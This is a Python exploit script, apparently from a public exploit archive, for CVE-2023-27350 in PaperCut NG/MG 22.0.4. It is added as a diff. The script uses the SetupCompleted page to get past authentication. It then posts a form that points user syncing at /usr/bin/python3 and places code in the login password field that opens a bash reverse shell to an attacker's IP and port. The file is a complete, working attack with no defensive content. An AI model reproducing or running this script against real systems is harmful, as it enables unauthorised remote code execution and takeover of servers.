@@ -1,0 +1,122 @@
+id: 38704
+date: 05/23/2023
+title: PaperCut NG/MG 22.0.4 - Remote Code Execution Exploit
+author: MaanVader
+cves: CVE-2023-27350
+
+# Exploit Title: PaperCut NG/MG 22.0.4 - Remote Code Execution (RCE)
+# Exploit Author: Mohin Paramasivam (Shad0wQu35t) and MaanVader
+# Vendor Homepage: https://www.papercut.com/
+# Version: 8.0 or later
+# Tested on: 22.0.4
+# CVE: CVE-2023-27350
+
+
+import requests
+import argparse
+
+Group_payload = {
+    "service":"direct/1/OptionsUserSync/$OptionsUserSource.$Form",
+    "sp":"S0",
+    "Form0":"$Hidden,$Hidden$0,$Hidden$1,$PropertySelection,$Hidden$2,$Hidden$3,$Hidden$4,$Hidden$5,$Hidden$6,$Hidden$7,$Hidden$8,$Hidden$9,$Hidden$10,$Hidden$11,$Hidden$12,$Hidden$13,$Hidden$14,$TextField,$TextField$0,$RadioGroup,$Submit,$Checkbox$2,primaryCardIdLength,$Checkbox$3,secondaryCardIdLength,$Checkbox$5,$Hidden$15,$Hidden$16,$Hidden$17,$Hidden$18,$Hidden$19,$Hidden$20,$Hidden$21,$PropertySelection$4,$TextField$13,$Checkbox$6,$TextField$14,$TextField$15,$TextField$16,$RadioGroup$0,$Submit$1,$PropertySelection$5,$TextField$17,$PropertySelection$6,$TextField$18,primaryCardId2Length,$PropertySelection$7,$TextField$19,secondaryCardId2Length,$Checkbox$7,$TextField$20,$Checkbox$8,$Checkbox$9,$Checkbox$10,$Submit$2,$Submit$3,$Submit$4,$Submit$5",
+    "$Hidden":"Sf278fd737ffcaed6eb3d1f67c2ba5c6d",
+    "$Hidden$0":"F",
+    "$Hidden$1":"F",
+    "$Hidden$2":"OH4sIAAAAAAAAAJWQwUrDQBCGp60VBBUp4lWRnncRPIjSg4iHwrYNpBU8xXW7JitJdp1sis2hF5_BlxBP-lw-gF50Y2Mp6MW5DTP_fP8_z2_QzBDotSqI4UaiyC0xIg1JJnGihCQDY5VOs5HrfZ2jkMOpkVeHny8bD8VeHVa6sBYYVBqVnTLYCnhuIw91iDzxuI0stNgtn3Aa8zSkvkWVhies1MTc3mhMLBwzR6c_dFrSaUWnf9LbXqV1h3aCfDFbwt7BDGr3CO3fwXKrYsK04LEq5Pg8zZPex26j87i-XQdwkn2NIeGGi0gSoZPE4Ulpnki3mpFS8N556r4eXBR1qDFoqj5P5BxoLKyejfzhoAcAYzNDOPrnZxfZoKrWt6nN8odzG6WB5aFjNk77l-YLeZfbs8sBAAA.",
+    "$Hidden$3":"F",
+    "$Hidden$4":"X",
+    "$Hidden$5":"X",
+    "$Hidden$6":"X",
+    "$Hidden$7":"X",
+    "$Hidden$8":"X",
+    "$Hidden$9":"X",
+    "$Hidden$10":"X",
+    "$Hidden$11":"X",
+    "$Hidden$12":"X",
+    "$Hidden$13":"F",
+    "$Hidden$14":"X",
+    "$Hidden$15":"F",
+    "$Hidden$16":"S",
+    "$Hidden$17":"S",
+    "$Hidden$18":"S",
+    "$Hidden$19":"S",
+    "$Hidden$20":"F",
+    "$Hidden$21":"SSTANDARD_UNIX",
+    "$PropertySelection":"3,CUSTOM",
+    "$TextField":"/usr/bin/python3",
+    "$TextField$0":"/usr/bin/python3",
+    "$RadioGroup":"0",
+    "primaryCardIdLength":"8",
+    "secondaryCardIdLength":"8",
+    "$PropertySelection$4":"0,STANDARD_UNIX",
+    "$TextField$13":"",
+    "$TextField$14":"",
+    "$TextField$15":"",
+    "$TextField$16":"",
+    "$RadioGroup$0":"0",
+    "$PropertySelection$5":"NONE",
+    "$TextField$17":"",
+    "$PropertySelection$6":"NONE",
+    "$TextField$18":"employeeNumber",
+    "primaryCardId2Length":"8",
+    "$PropertySelection$7":"NONE",
+    "$TextField$19":"",
+    "secondaryCardId2Length":"8",
+    "$TextField$20":"",
+    "$Submit$4":"Apply"
+
+}
+
+
+parser = argparse.ArgumentParser(description="Papercut RCE")
+parser.add_argument('--url',help='Url of the vunerable application example http://10.2.3.4:9191 dont need the trailing /')
+parser.add_argument('--ip',help='our rev shell ip')
+parser.add_argument('--port',help='our rev shell port')
+args = parser.parse_args()
+
+url = args.url
+ip = args.ip
+port = args.port
+
+passwd_input = f"import os;os.system(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\")"
+
+final_payload = {
+    "service":"direct/1/Home/$Form$0",
+    "sp":"S0",
+    "Form0":"$Hidden$0,$Hidden$1,inputUsername,inputPassword,$PropertySelection$0,$Submit$0",
+    "$Hidden$0":"true",
+    "$Hidden$1":"X",
+    "inputUsername":"help",
+    "inputPassword":passwd_input,
+    "$PropertySelection$0":"en",
+    "$Submit$0":"Log+in"
+}
+
+# create a session
+session = requests.Session()
+
+# visit the first URL to set up the session
+setup_url = url+"/app?service=page/SetupCompleted"
+response = session.get(setup_url)
+response.raise_for_status()  # check for any errors
+
+# visit the second URL using the same session
+dashboard_url = url+"/app?service=page/Dashboard"
+response = session.get(dashboard_url)
+response.raise_for_status()  # check for any errors
+
+# URL to change user group
+user_group_change_url = url+"/app"
+response = session.post(user_group_change_url,data=Group_payload)
+response.raise_for_status() # check for errors
+
+# URL to gain RCE
+rce_url = url+"/app"
+response = session.post(rce_url,data=final_payload)
+response.raise_for_status() # Check for any errors
+
+
+# print the response text
+print(response.text)
+
+#  0day.today [2023-06-08]  #
